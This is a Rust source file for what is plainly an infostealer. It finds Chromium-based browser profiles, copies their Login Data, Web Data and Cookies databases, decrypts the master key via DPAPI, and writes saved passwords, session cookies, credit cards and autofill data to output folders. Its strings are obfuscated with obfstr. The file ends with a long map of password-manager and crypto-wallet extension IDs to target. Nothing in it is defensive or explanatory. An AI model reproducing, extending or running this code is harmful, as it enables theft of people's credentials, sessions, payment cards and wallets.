use crate::chromium::decryption_core::crypt_unprotect_data;
use crate::chromium::main::DumperResult;
use crate::chromium::models::{
    ChromeAccount, ChromeCookie, CreditCard, DecryptedAccount, DecryptedCookie,
    DecryptedCreditCard, LocalState,
};
use rusqlite::Connection;
use std::fmt::Debug;
use std::fs::File;
use std::io::{BufReader, Read};
use std::path::PathBuf;
use std::fs;
use obfstr::obfstr;

impl From<rusqlite::Error> for DumperError {
    fn from(e: rusqlite::Error) -> Self {
        DumperError::SqliteError(e)
    }
}


static mut PROFILES: Vec<String> = vec![];

#[derive(Debug)]
pub enum DumperError {
    SqliteError(rusqlite::Error),
    BrowserNotFound,
    DpapiFailedToDecrypt(u32),
    AesFailedToDecrypt,
    FromUtf8Error,
    IoError,
    JsonError(serde_json::Error),
    Base64Error,
}
use serde::Serialize;

#[derive(Serialize, Clone)]
pub struct AppInfo {
    pub name: String,
    pub author: String,
}
#[derive(Serialize, Clone)]
pub struct Dumper {
    #[serde(skip_serializing)]
    pub app_info: AppInfo,
    local_state_buf: String,
    pub accounts: Vec<DecryptedAccount>,
    pub cookies: Vec<DecryptedCookie>,
    pub creditcards: Vec<DecryptedCreditCard>,
    pub autofill: Vec<AutoFill>,
}

use std::io::Write;

use super::models::AutoFill;
impl Dumper {
    pub fn new(name_in: &str, author: &str) -> Self {
        
        let name: String = match name_in {
            "" => obfstr::obfstr!("User Data").to_string(),
            _ => name_in.to_string(),
        };

        Dumper {
            app_info: AppInfo { name: name.to_string(), author: author.to_string() },
            local_state_buf: String::new(),
            accounts: vec![],
            cookies: vec![],
            creditcards: vec![],
            autofill: vec![],
        }
    }
}

impl Dumper {

    /// Look for the local_state file
    fn find_browser_local_state(&self) -> DumperResult<PathBuf> {
        /*let path: String = match self.app_info.name.as_str() {
            "User Data" => obfstr::obfstr!("/Local State").to_string(),
            _ => obfstr::obfstr!("User Data/Local State").to_string(),
        };

        let path2 = format!("{}\\{}\\{}\\{}", std::env::var("LOCALAPPDATA").unwrap(), &self.app_info.author, &self.app_info.name, path);

        if !std::path::Path::new(&path2).exists() {
            let path = format!("{}\\{}\\{}\\{}", std::env::var("APPDATA").unwrap(), &self.app_info.author, &self.app_info.name, path);
            println!("path: {}", path);
            if std::path::Path::new(&path).exists() {
                return Ok(std::path::Path::new(&path).to_path_buf());
            }
            return Err(DumperError::BrowserNotFound);
        }else {

            return Ok(std::path::Path::new(&path2).to_path_buf());
        }*/

        // try to find the local state file

        let mut possible_paths = vec![];

        possible_paths.push(obfstr::obfstr!("User Data/Local State").to_string());
        possible_paths.push(obfstr::obfstr!("Local State").to_string());
        possible_paths.push(obfstr::obfstr!("Network/Local State").to_string());
        possible_paths.push(obfstr::obfstr!("LocalPrefs.json").to_string());

        unsafe {
            for path in PROFILES.clone() {
                possible_paths.push(format!("{path}{}", obfstr::obfstr!("\\Local State"), path = path).to_string());

            }
        }

        let possible_vars = vec![obfstr::obfstr!("LOCALAPPDATA").to_string(), obfstr::obfstr!("APPDATA").to_string(), obfstr::obfstr!("USERPROFILE").to_string()];

        for var in possible_vars {
            for path in &possible_paths {
                let path = format!("{}\\{}\\{}\\{}", std::env::var(var.clone()).unwrap(), &self.app_info.author, &self.app_info.name, path);
                if std::path::Path::new(&path).exists() {
                    return Ok(std::path::Path::new(&path).to_path_buf());
                }
            }
        }

        return Err(DumperError::BrowserNotFound);

    }

    /// Tried to read local_state file
    fn read_local_state(&mut self) -> DumperResult<LocalState> {
        let path = self.find_browser_local_state()?;
        let file = File::open(path)?;
        let mut reader = BufReader::new(file);
        reader.read_to_string(&mut self.local_state_buf)?;

        Ok(serde_json::from_str(self.local_state_buf.as_str())
            .map_err(|e| DumperError::JsonError(e))?)
    }

    /// Queries account in sqlite db file
    fn query_accounts(&self, path: String) -> DumperResult<Vec<ChromeAccount>> {

        let path = format!("{path}\\{}", obfstr::obfstr!("Login Data"));

        if !std::path::Path::new(&path).exists() {
            return Err(DumperError::BrowserNotFound);
        }

        let dir = std::env::temp_dir();

        let new_path_buf = PathBuf::from(format!(
            "{}/{}{}",
            dir.display(),
            format!("{}_{}", self.app_info.author, std::path::Path::new(&path).parent().unwrap().file_name().unwrap().to_str().unwrap()).to_lowercase(),
            obfstr::obfstr!("_login_data")
        ));
        fs::copy(path, new_path_buf.as_path())?;

        let conn = Connection::open(new_path_buf)?;
        let mut stmt = conn.prepare(obfstr::obfstr!("SELECT action_url, username_value, password_value FROM logins"))?;

        let chrome_accounts: Vec<ChromeAccount> = stmt
            .query_map([], |row| {
                Ok(ChromeAccount::new(row.get(0)?, row.get(1)?, row.get(2)?))
            })?
            .filter_map(|acc| acc.ok())
            .collect();

        println!("{}{}{}", obfstr::obfstr!("accounts"), chrome_accounts.len(), obfstr::obfstr!("accounts"));

        Ok(chrome_accounts)
    }

    /// Queries account in sqlite db file
    fn query_creditcard(&self, path: String) -> DumperResult<Vec<CreditCard>> {
        let path = format!("{path}{}", obfstr::obfstr!("\\Web Data"));                             
        if !std::path::Path::new(&path).exists() {
            return Err(DumperError::BrowserNotFound);
        }

        let dir = std::env::temp_dir();

        let new_path_buf = PathBuf::from(format!(
            "{}/{}{}",
            dir.display(),
            format!("{}_{}", self.app_info.author, std::path::Path::new(&path).parent().unwrap().file_name().unwrap().to_str().unwrap()).to_lowercase(),
            obfstr::obfstr!("_webdata")
        ));
        fs::copy(path, new_path_buf.as_path())?;

        let db_url = new_path_buf.clone();
        let conn = Connection::open(db_url)?;
        let mut stmt = conn.prepare(obfstr!("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards"))?;

        let chrome_accounts: Vec<CreditCard> = stmt
            .query_map([], |row| {
                Ok(CreditCard::new(
                    row.get(0)?,
                    row.get(1)?,
                    row.get(2)?,
                    row.get(3)?,
                ))
            })?
            .filter_map(|acc| acc.ok())
            .collect();

        //println!("{:?}", self.autofill);

        Ok(chrome_accounts)
    }

    fn query_autofill(&self, path: String) -> DumperResult<Vec<AutoFill>> {
        let path = format!("{path}{}", obfstr::obfstr!("\\Web Data"));   
        if !std::path::Path::new(&path).exists() {
            return Err(DumperError::BrowserNotFound);
        }
        println!("{}", path);

            let dir = std::env::temp_dir();

            let new_path_buf = PathBuf::from(format!(
                "{}/{}{}",
                dir.display(),
                format!("{}_{}", self.app_info.author, std::path::Path::new(&path).parent().unwrap().file_name().unwrap().to_str().unwrap()).to_lowercase(),
                obfstr::obfstr!("_webdata")
            ));
            fs::copy(path, new_path_buf.as_path())?;
            let db_url = new_path_buf.clone();
            let conn = Connection::open(db_url)?;
            let mut stmt = conn.prepare(obfstr!("SELECT name, value FROM autofill"))?;
    
            let chrome_accounts: Vec<AutoFill> = stmt
                .query_map([], |row| {
                    Ok(AutoFill::new(
                        row.get(0)?,
                        row.get(1)?,
                    ))
                })?
                .filter_map(|acc| acc.ok())
                .collect();

                return Ok(chrome_accounts);

    }

    /// Queries account in sqlite db file
    fn query_cookies(&self, path: String) -> DumperResult<Vec<ChromeCookie>> {
        let path = format!("{path}{}", obfstr::obfstr!("\\Network/Cookies"));                    

        if !std::path::Path::new(&path).exists() {
            return Err(DumperError::BrowserNotFound);
        }

        let dir = std::env::temp_dir();

        let new_path_buf = PathBuf::from(format!(
            "{}/{}{}",
            dir.display(),
            format!("{}_{}", self.app_info.author, std::path::Path::new(&path).parent().unwrap().file_name().unwrap().to_str().unwrap()).to_lowercase(),
            obfstr::obfstr!("_cookies")
        ));
        fs::copy(path, new_path_buf.as_path())?;

        let db_url = new_path_buf;
        let conn = Connection::open(db_url)?;
        let mut stmt = conn.prepare(
            obfstr!("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies"),
        )?;

        let chrome_accounts: Vec<ChromeCookie> = stmt
            .query_map([], |row| {
                Ok(ChromeCookie::new(
                    row.get(0)?,
                    row.get(1)?,
                    row.get(2)?,
                    row.get(3)?,
                    row.get(4)?,
                    row.get(5)?,
                ))
            })?
            .filter_map(|acc| acc.ok())
            .collect();

        println!("{}{}{}", obfstr::obfstr!("Found"), chrome_accounts.len(), obfstr::obfstr!("cookies"));

        Ok(chrome_accounts)
    }

    /// Tries to dump data to struct account vec
    pub unsafe fn dump(&mut self, path_output: String) -> DumperResult<()> {
        if !std::path::Path::new(&format!("{}\\{}\\{}\\", std::env::var( obfstr::obfstr!("LOCALAPPDATA")).unwrap(), &self.app_info.author, &self.app_info.name)).exists() && !std::path::Path::new(&format!("{}\\{}\\{}\\", std::env::var("APPDATA").unwrap(), &self.app_info.author, &self.app_info.name)).exists(){
            println!("{}\\{}\\{}\\", std::env::var( obfstr::obfstr!("LOCALAPPDATA")).unwrap(), &self.app_info.author, &self.app_info.name);
            println!("{}\\{}\\{}\\", std::env::var( obfstr::obfstr!("APPDATA")).unwrap(), &self.app_info.author, &self.app_info.name);
            return Err(DumperError::BrowserNotFound);
        }

        // make a password,cookie,creditcard,autofill folder
        std::fs::create_dir_all(&format!("{path_output}{}", obfstr::obfstr!("\\Passwords\\"))).unwrap();
        std::fs::create_dir_all(&format!("{path_output}{}", obfstr::obfstr!("\\Cookies\\"))).unwrap();
        std::fs::create_dir_all(&format!("{path_output}{}", obfstr::obfstr!("\\Creditcards\\"))).unwrap();
        std::fs::create_dir_all(&format!("{path_output}{}", obfstr::obfstr!("\\Autofill\\"))).unwrap();

     // loop thru chrome dir and check if files exist
     PROFILES = Vec::new();

     let path = format!("{}\\{}\\{}\\", std::env::var( obfstr::obfstr!("LOCALAPPDATA")).unwrap(), &self.app_info.author, &self.app_info.name);

     let max_depth = 4;

     println!("{}{}", obfstr::obfstr!("Searching for profiles in "), path);

     // loop thru path and check if files "Login Data" and "Web Data" exists and then push the parent path to PROFILES
     for entry in walkdir::WalkDir::new(path).max_depth(max_depth).into_iter().filter_map(|e| e.ok()) {
         let path = entry.path();
         let login_data = format!("{}{}", path.display(), obfstr::obfstr!("/Login Data"));
         let web_data = format!("{}{}",  path.display(), obfstr::obfstr!("/Web Data"));

         if std::path::Path::new(&login_data).exists() && std::path::Path::new(&web_data).exists() {
             if !PROFILES.contains(&path.to_string_lossy().to_string()) {
                 let binding = &path.to_string_lossy().to_string();
                 let profile_name = std::path::Path::new(&binding).file_name().unwrap().to_str().unwrap();
                 println!("{}{}", obfstr::obfstr!("Found profile: "), &profile_name);
                 PROFILES.push(path.to_string_lossy().to_string());
                 let _ = std::fs::create_dir_all(&format!("{path_output}{}{}{}", obfstr::obfstr!("\\Passwords\\"), self.app_info.author, path.to_string_lossy().to_string().clone().split("\\").last().unwrap()).to_lowercase());
                 let _ = std::fs::create_dir_all(&format!("{path_output}{}{}{}", obfstr::obfstr!("\\Creditcards\\"), self.app_info.author, path.to_string_lossy().to_string().clone().split("\\").last().unwrap()).to_lowercase());
                 let _ = std::fs::create_dir_all(&format!("{path_output}{}{}{}", obfstr::obfstr!("\\Autofill\\"), self.app_info.author, path.to_string_lossy().to_string().clone().split("\\").last().unwrap()).to_lowercase());
             }
         }
     }

     let path = format!("{}\\{}\\{}\\", std::env::var( obfstr::obfstr!("APPDATA")).unwrap(), &self.app_info.author, &self.app_info.name);

     let max_depth = 4;

     println!("{}{}", obfstr::obfstr!("Searching for profiles in "), path);

     // loop thru path and check if files "Login Data" and "Web Data" exists and then push the parent path to PROFILES
     for entry in walkdir::WalkDir::new(path).max_depth(max_depth).into_iter().filter_map(|e| e.ok()) {
         let path = entry.path();
         let login_data = format!("{}{}", path.display(), obfstr::obfstr!("/Login Data"));
         let web_data = format!("{}{}", path.display(), obfstr::obfstr!("/Web Data"));

         if std::path::Path::new(&login_data).exists() && std::path::Path::new(&web_data).exists() {
             if !PROFILES.contains(&path.to_string_lossy().to_string()) {
                 let binding = &path.to_string_lossy().to_string();
                 let profile_name = std::path::Path::new(&binding).file_name().unwrap().to_str().unwrap();
                 println!("{}{}", obfstr::obfstr!("Found profile: "), &profile_name);
                 PROFILES.push(path.to_string_lossy().to_string());
                 let _ = std::fs::create_dir_all(&format!("{path_output}{}{}{}", obfstr::obfstr!("\\Passwords\\"), self.app_info.author, path.to_string_lossy().to_string().clone().split("\\").last().unwrap()).to_lowercase());
                 let _ = std::fs::create_dir_all(&format!("{path_output}{}{}{}", obfstr::obfstr!("\\Creditcards\\"), self.app_info.author, path.to_string_lossy().to_string().clone().split("\\").last().unwrap()).to_lowercase());
                 let _ = std::fs::create_dir_all(&format!("{path_output}{}{}{}", obfstr::obfstr!("\\Autofill\\"), self.app_info.author, path.to_string_lossy().to_string().clone().split("\\").last().unwrap()).to_lowercase());
             }
         }
     }

     println!("{}{}{}{}", obfstr::obfstr!("Found "), PROFILES.len(), obfstr::obfstr!(" profiles in "), self.app_info.name);
     println!("{:#?}", PROFILES);

        let local_state = self.read_local_state().ok();
        println!("{:#?}", local_state);  
        if let Some(local_state) = local_state {
            let mut decoded_encryption_key =
                base64::decode(local_state.os_crypt.encrypted_key.to_string())
                    .map_err(|_| DumperError::Base64Error)?;

            let mut master_key = crypt_unprotect_data(&mut decoded_encryption_key[5..])?;

            unsafe {
            for profile in PROFILES.clone() {                
                self.autofill.clear();

            let mut accounts = self
                .query_accounts(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.encrypted_pwd.is_empty() && !acc.website.is_empty())
                .map(|acc| {
                    let res = DecryptedAccount::from_chrome_acc(acc.clone(), None);
                    if let Err(_) = res {
                        DecryptedAccount::from_chrome_acc(
                            acc.clone(),
                            Some(master_key.as_mut_slice()),
                        )
                    } else {
                        res
                    }
                })
                .filter_map(|v| v.ok())
                .collect::<Vec<_>>();


                let mut autofill = self
                .query_autofill(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.name.is_empty() && !acc.value.is_empty())
                .collect::<Vec<_>>();


                if autofill.len() > 0 {

                    let text = autofill.iter()
                  .map(|acc| format!("{}: {}", acc.name, acc.value))
                  .collect::<Vec<_>>()
                  .join("\n");

                      std::fs::File::create(format!(
                          "{path}\\{filename}\\{author}\\{filename}.txt",
                          path=path_output.clone(), author=format!("{}{}", self.app_info.author, profile.clone().split("\\").last().unwrap()).to_lowercase(), filename=obfstr::obfstr!("autofill"),
                      ))
                      .unwrap()
                      .write(text.as_bytes())
                      .unwrap();
                  }

                self.autofill.append(&mut autofill);
                
            if accounts.len() > 0 {

                crate::PASSWORDS += accounts.len();

                let text = accounts.iter()
              .map(|acc| format!("{}: {}:{}", acc.website, acc.username_value, acc.pwd))
              .collect::<Vec<_>>()
              .join("\n");
  
                  std::fs::File::create(format!(
                      "{path}\\{filename}\\{author}\\{filename}.txt",
                      path=path_output.clone(), author=format!("{}{}", self.app_info.author, profile.clone().split("\\").last().unwrap()).to_lowercase(), filename=obfstr::obfstr!("passwords"), 
                  ))
                  .unwrap()
                  .write(text.as_bytes())
                  .unwrap();

                // create {path}\\passwords.txt if not exists
                let path = format!("{}\\{}", path_output,obfstr::obfstr!("passwords.txt"));
                if !std::path::Path::new(&path).exists() {
                    std::fs::File::create(&path).unwrap();
                }

                // write it in this format:

                /*
                URL:
                Username:
                Password:
                Application: 
                
                 */

                let mut text = String::from("");

                for account in accounts.clone() {
                    text.push_str(&format!("{}{}{}{}{}{}{}{}{}", obfstr::obfstr!("URL: "), account.website, obfstr::obfstr!("\r\nUsername: "), account.username_value, obfstr::obfstr!("\r\nPassword: "), account.pwd, obfstr::obfstr!("\r\nApplication: "), self.app_info.name, obfstr::obfstr!("\r\n===============\r\n")));
                }
                //append to file
                std::fs::OpenOptions::new()
                .write(true)
                .append(true)
                .open(path)
                .unwrap()
                .write(text.as_bytes())
                .unwrap();
            }
                self.accounts.append(&mut accounts);

                let mut cookies = self
                .query_cookies(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.encrypted_cookie.is_empty() && !acc.hostkey.is_empty())
                .map(|acc| {
                    let res = DecryptedCookie::from_chrome_acc(acc.clone(), None);
                    if let Err(_) = res {
                        DecryptedCookie::from_chrome_acc(
                            acc.clone(),
                            Some(master_key.as_mut_slice()),
                        )
                    } else {
                        res
                    }
                })
                .filter_map(|v| v.ok())
                .collect::<Vec<_>>();

                if cookies.len() > 0 {
                   crate::COOKIES += cookies.len();

                   println!("{}{}{}{}", cookies.len(), self.app_info.name, obfstr::obfstr!("Found "), obfstr::obfstr!(" cookies in "));

                    let mut text = String::from("");
                    text.push_str(&cookies
                            .iter()
                            .map(|acc| {
                                format!(
                                    "{website}\t{http_only}\t{path}\t{is_secure}\t{timestamp}\t{name}\t{value}",
                                    website = acc.hostkey,
                                    is_secure = match acc.secure {
                                        0 => {
                                            "FALSE"
                                        }
                                        1 => {
                                            "TRUE"
                                        }
                                        _ => {
                                            "UNKNOWN"
                                        }
                                    },
                                    http_only = !acc.hostkey.starts_with("."),
                                    timestamp = acc.expire_utc,
                                    name = acc.name,
                                    value = acc.encrypted_cookie,
                                    path = acc.path
                                )
                            })
                            .collect::<Vec<_>>()
                            .join("\n"),
                    );

                    let path_out = path_output.clone();

                    let formatted = format!("{}{}{}_[{}]_{profile}{}", path_out.clone(), obfstr::obfstr!("\\Cookies\\"), self.app_info.author, self.app_info.name, obfstr::obfstr!(" Network.txt"), profile=profile.clone().split("\\").last().unwrap());
      
                      std::fs::File::create(formatted)
                      .unwrap()
                      .write(text.as_bytes())
                      .unwrap();
                  }
                  self.cookies.append(&mut cookies);

            let mut credit_card = self
                .query_creditcard(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.encrypted_number.is_empty())
                .map(|acc| {
                    let res = DecryptedCreditCard::from_chrome_acc(acc.clone(), None);
                 
                    if let Err(_) = res {
                        DecryptedCreditCard::from_chrome_acc(
                            acc.clone(),
                            Some(master_key.as_mut_slice()),
                        )
                    } else {
                        res
                    }
                })
                .filter_map(|v| v.ok())
                .collect::<Vec<_>>();

                if credit_card.len() > 0 {
                    crate::CREDIT_CARDS += credit_card.len();
                    let text = credit_card.iter()
              .map(|acc| format!("{}: {} {}/{}", acc.name_on_card, acc.encrypted_number, acc.expiration_month, acc.expiration_year))
                  .collect::<Vec<_>>()
                  .join("\n");
      
                      std::fs::File::create(format!(
                          "{path}\\{filename}\\{author}\\{filename}.txt",
                          path=path_output.clone(),author=format!("{}{}", self.app_info.author, profile.clone().split("\\").last().unwrap()).to_lowercase(), filename=obfstr::obfstr!("creditcards"),
                      ))
                      .unwrap()
                      .write(text.as_bytes())
                      .unwrap();
                  }
                self.creditcards.append(&mut credit_card);
            }
        }
           
        } else {
            unsafe {
            for profile in PROFILES.clone() {
                self.autofill.clear();
            let mut accounts = self
                .query_accounts(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.encrypted_pwd.is_empty() && !acc.website.is_empty())
                .filter_map(|acc| DecryptedAccount::from_chrome_acc(acc.clone(), None).ok())
                .collect::<Vec<_>>();

            let mut cookies = self
                .query_cookies(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.encrypted_cookie.is_empty() && !acc.hostkey.is_empty())
                .filter_map(|acc| DecryptedCookie::from_chrome_acc(acc.clone(), None).ok())
                .collect::<Vec<_>>();
            let mut cc = self
                .query_creditcard(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.encrypted_number.is_empty())
                .filter_map(|acc| DecryptedCreditCard::from_chrome_acc(acc.clone(), None).ok())
                .collect::<Vec<_>>();
                
                let mut autofill = self
                .query_autofill(profile.clone())?
                .into_iter()
                .filter(|acc| !acc.name.is_empty() && !acc.value.is_empty())
                .collect::<Vec<_>>();

                println!("{:?}", autofill);
                if autofill.len() > 0 {

                    let text = autofill.iter()
                  .map(|acc| format!("{}: {}", acc.name, acc.value))
                  .collect::<Vec<_>>()
                  .join("\n");
                  

                    println!("{}", format!(
                        "{path}\\{filename}\\{author}\\{filename}.txt",
                        path=path_output.clone(), author=format!("{}{}", self.app_info.author, profile.clone().split("\\").last().unwrap()).to_lowercase(), filename=obfstr::obfstr!("autofill"),
                    ));
      
                      std::fs::File::create(format!(
                          "{path}\\{filename}\\{author}\\{filename}.txt",
                          path=path_output.clone(), author=format!("{}{}", self.app_info.author, profile.clone().split("\\").last().unwrap()).to_lowercase(), filename=obfstr::obfstr!("autofill"),
                      ))
                      .unwrap()
                      .write(text.as_bytes())
                      .unwrap();
                    }
      
            self.autofill.append(&mut autofill);
            self.accounts.append(&mut accounts);
            self.cookies.append(&mut cookies);
            self.creditcards.append(&mut cc);

            if accounts.len() > 0 {

                crate::PASSWORDS += accounts.len();

                let text = accounts.iter()
              .map(|acc| format!("{}: {}:{}", acc.website, acc.username_value, acc.pwd))
              .collect::<Vec<_>>()
              .join("\n");
  
                  std::fs::File::create(format!(
                      "{path}\\{filename}\\{author}\\{filename}.txt",
                      path=path_output.clone(),author=format!("{}{}", self.app_info.author, profile.clone().split("\\").last().unwrap()).to_lowercase(), filename=obfstr::obfstr!("passwords"),
                  ))
                  .unwrap()
                  .write(text.as_bytes())
                  .unwrap();

                  let path = format!("{}\\{}", path_output, obfstr::obfstr!("passwords.txt"));
                                 if !std::path::Path::new(&path).exists() {
                                     std::fs::File::create(&path).unwrap();
                                 }
                  let mut text = String::from("");
                 
                                 for account in accounts.clone() {
                                     text.push_str(&format!("{}{}{}{}{}{}{}{}{}", obfstr::obfstr!("URL: "), account.website, obfstr::obfstr!("\r\nUsername: "), account.username_value, obfstr::obfstr!("\r\nPassword: "), account.pwd, obfstr::obfstr!("\r\nApplication: "), self.app_info.name, obfstr::obfstr!("\r\n===============\r\n")));
                               }
                                 //append to file
                                 std::fs::OpenOptions::new()
                                 .write(true)
                                 .append(true)
                                 .open(path)
                                 .unwrap()
                                 .write(text.as_bytes())
                                 .unwrap();
              }

              if cookies.len() > 0 {

                 crate::COOKIES += cookies.len();

                let mut text = String::from("");
                text.push_str(&cookies
                        .iter()
                        .map(|acc| {
                            format!(
                                "{website}\t{http_only}\t{path}\t{is_secure}\t{timestamp}\t{name}\t{value}",
                                website = acc.hostkey,
                                is_secure = match acc.secure {
                                    0 => {
                                        "FALSE"
                                    }
                                    1 => {
                                        "TRUE"
                                    }
                                    _ => {
                                        "UNKNOWN"
                                    }
                                },
                                http_only = !acc.hostkey.starts_with("."),
                                timestamp = acc.expire_utc,
                                name = acc.name,
                                value = acc.encrypted_cookie,
                                path = acc.path
                            )
                        })
                        .collect::<Vec<_>>()
                        .join("\n"),
                );

                let path_out = path_output.clone();

                    let formatted = format!("{}{}{}_[{}]_{profile}{}", path_out.clone(), obfstr::obfstr!("\\Cookies\\"), self.app_info.author, self.app_info.name, obfstr::obfstr!(" Network.txt"), profile=profile.clone().split("\\").last().unwrap());
  
                  std::fs::File::create(formatted)
                  .unwrap()
                  .write(text.as_bytes())
                  .unwrap();
              }

              if cc.len() > 0 {

                crate::CREDIT_CARDS += cc.len();

                let text = cc.iter()
              .map(|acc| format!("{}: {} {}/{}", acc.name_on_card, acc.encrypted_number, acc.expiration_month, acc.expiration_year))
              .collect::<Vec<_>>()
              .join("\n");
  
                  std::fs::File::create(format!(
                      "{path}\\{filename}\\{author}\\{filename}.txt",
                      path=path_output.clone(),author=format!("{}{}", self.app_info.author, profile.clone().split("\\").last().unwrap()).to_lowercase(), filename=obfstr::obfstr!("creditcards"),
                  ))
                  .unwrap()
                  .write(text.as_bytes())
                  .unwrap();
              }

            }
        }

        }
        let mut extensions = std::collections::HashMap::new(); 
        extensions.insert(obfstr::obfstr!("Authenticator").to_string(),           obfstr::obfstr!("bhghoamapcdpbohphigoooaddinpkbai").to_string());
        extensions.insert(obfstr::obfstr!("EOS Authenticator").to_string(),       obfstr::obfstr!("oeljdldpnmdbchonielidgobddffflal").to_string());
        extensions.insert(obfstr::obfstr!("Bitwarden").to_string(),               obfstr::obfstr!("nngceckbapebfimnlniiiahkandclblb").to_string());
        extensions.insert(obfstr::obfstr!("KeePassXC").to_string(),               obfstr::obfstr!("oboonakemofpalcgghocfoadofidjkkk").to_string());
        extensions.insert(obfstr::obfstr!("Dashlane").to_string(),                obfstr::obfstr!("fdjamakpfbbddfjaooikfcpapjohcfmg").to_string());
        extensions.insert(obfstr::obfstr!("1Password").to_string(),               obfstr::obfstr!("aeblfdkhhhdcdjpifhhbdiojplfjncoa").to_string());
        extensions.insert(obfstr::obfstr!("NordPass").to_string(),                obfstr::obfstr!("fooolghllnmhmmndgjiamiiodkpenpbb").to_string());
        extensions.insert(obfstr::obfstr!("Keeper").to_string(),                  obfstr::obfstr!("bfogiafebfohielmmehodmfbbebbbpei").to_string());
        extensions.insert(obfstr::obfstr!("RoboForm").to_string(),                obfstr::obfstr!("pnlccmojcmeohlpggmfnbbiapkmbliob").to_string());
        extensions.insert(obfstr::obfstr!("LastPass").to_string(),                obfstr::obfstr!("hdokiejnpimakedhajhdlcegeplioahd").to_string());
        extensions.insert(obfstr::obfstr!("BrowserPass").to_string(),             obfstr::obfstr!("naepdomgkenhinolocfifgehidddafch").to_string());
        extensions.insert(obfstr::obfstr!("MYKI").to_string(),                    obfstr::obfstr!("bmikpgodpkclnkgmnpphehdgcimmided").to_string());
        extensions.insert(obfstr::obfstr!("Splikity").to_string(),                obfstr::obfstr!("jhfjfclepacoldmjmkmdlmganfaalklb").to_string());
        extensions.insert(obfstr::obfstr!("CommonKey").to_string(),               obfstr::obfstr!("chgfefjpcobfbnpmiokfjjaglahmnded").to_string());
        extensions.insert(obfstr::obfstr!("Zoho Vault").to_string(),              obfstr::obfstr!("igkpcodhieompeloncfnbekccinhapdb").to_string());
        extensions.insert(obfstr::obfstr!("Norton Password Manager").to_string(), obfstr::obfstr!("admmjipmmciaobhojoghlmleefbicajg").to_string());
        extensions.insert(obfstr::obfstr!("Avira Password Manager").to_string(),  obfstr::obfstr!("caljgklbbfbcjjanaijlacgncafpegll").to_string());
        extensions.insert(obfstr::obfstr!("Trezor Password Manager").to_string(), obfstr::obfstr!("imloifkgjagghnncjkhggdhalmcnfklk").to_string());    
        extensions.insert(obfstr::obfstr!("MetaMask").to_string(),                obfstr::obfstr!("nkbihfbeogaeaoehlefnkodbefgpgknn").to_string());
        extensions.insert(obfstr::obfstr!("TronLink").to_string(),                obfstr::obfstr!("ibnejdfjmmkpcnlpebklmnkoeoihofec").to_string());
        extensions.insert(obfstr::obfstr!("BinanceChain").to_string(),            obfstr::obfstr!("fhbohimaelbohpjbbldcngcnapndodjp").to_string());
        extensions.insert(obfstr::obfstr!("Coin98").to_string(),                  obfstr::obfstr!("aeachknmefphepccionboohckonoeemg").to_string());
        extensions.insert(obfstr::obfstr!("iWallet").to_string(),                 obfstr::obfstr!("kncchdigobghenbbaddojjnnaogfppfj").to_string());
        extensions.insert(obfstr::obfstr!("Wombat").to_string(),                  obfstr::obfstr!("amkmjjmmflddogmhpjloimipbofnfjih").to_string());
        extensions.insert(obfstr::obfstr!("MEW CX").to_string(),                  obfstr::obfstr!("nlbmnnijcnlegkjjpcfjclmcfggfefdm").to_string());
        extensions.insert(obfstr::obfstr!("NeoLine").to_string(),                 obfstr::obfstr!("cphhlgmgameodnhkjdmkpanlelnlohao").to_string());
        extensions.insert(obfstr::obfstr!("Terra Station").to_string(),           obfstr::obfstr!("aiifbnbfobpmeekipheeijimdpnlpgpp").to_string());
        extensions.insert(obfstr::obfstr!("Keplr").to_string(),                   obfstr::obfstr!("dmkamcknogkgcdfhhbddcghachkejeap").to_string());
        extensions.insert(obfstr::obfstr!("Sollet").to_string(),                  obfstr::obfstr!("fhmfendgdocmcbmfikdcogofphimnkno").to_string());
        extensions.insert(obfstr::obfstr!("ICONex").to_string(),                  obfstr::obfstr!("flpiciilemghbmfalicajoolhkkenfel").to_string());
        extensions.insert(obfstr::obfstr!("KHC").to_string(),                     obfstr::obfstr!("hcflpincpppdclinealmandijcmnkbgn").to_string());
        extensions.insert(obfstr::obfstr!("TezBox").to_string(),                 obfstr::obfstr!("mnfifefkajgofkcjkemidiaecocnkjeh").to_string());
        extensions.insert(obfstr::obfstr!("Byone").to_string(),                   obfstr::obfstr!("nlgbhdfgdhgbiamfdfmbikcdghidoadd").to_string());
        extensions.insert(obfstr::obfstr!("OneKey").to_string(),                  obfstr::obfstr!("infeboajgfhgbjpjbeppbkgnabfdkdaf").to_string());
        extensions.insert(obfstr::obfstr!("DAppPlay").to_string(),                obfstr::obfstr!("lodccjjbdhfakaekdiahmedfbieldgik").to_string());
        extensions.insert(obfstr::obfstr!("BitClip").to_string(),                 obfstr::obfstr!("ijmpgkjfkbfhoebgogflfebnmejmfbml").to_string());
        extensions.insert(obfstr::obfstr!("Steem Keychain").to_string(),          obfstr::obfstr!("lkcjlnjfpbikmcmbachjpdbijejflpcm").to_string());
        extensions.insert(obfstr::obfstr!("Nash Extension").to_string(),          obfstr::obfstr!("onofpnbbkehpmmoabgpcpmigafmmnjhl").to_string());
        extensions.insert(obfstr::obfstr!("Hycon Lite Client").to_string(),       obfstr::obfstr!("bcopgchhojmggmffilplmbdicgaihlkp").to_string());
        extensions.insert(obfstr::obfstr!("ZilPay").to_string(),                  obfstr::obfstr!("klnaejjgbibmhlephnhpmaofohgkpgkd").to_string());
        extensions.insert(obfstr::obfstr!("Leaf Wallet").to_string(),             obfstr::obfstr!("cihmoadaighcejopammfbmddcmdekcje").to_string());
        extensions.insert(obfstr::obfstr!("Cyano Wallet").to_string(),            obfstr::obfstr!("dkdedlpgdmmkkfjabffeganieamfklkm").to_string());
        extensions.insert(obfstr::obfstr!("Cyano Wallet Pro").to_string(),        obfstr::obfstr!("icmkfkmjoklfhlfdkkkgpnpldkgdmhoe").to_string());
        extensions.insert(obfstr::obfstr!("Nabox Wallet").to_string(),            obfstr::obfstr!("nknhiehlklippafakaeklbeglecifhad").to_string());
        extensions.insert(obfstr::obfstr!("Polymesh Wallet").to_string(),         obfstr::obfstr!("jojhfeoedkpkglbfimdfabpdfjaoolaf").to_string());
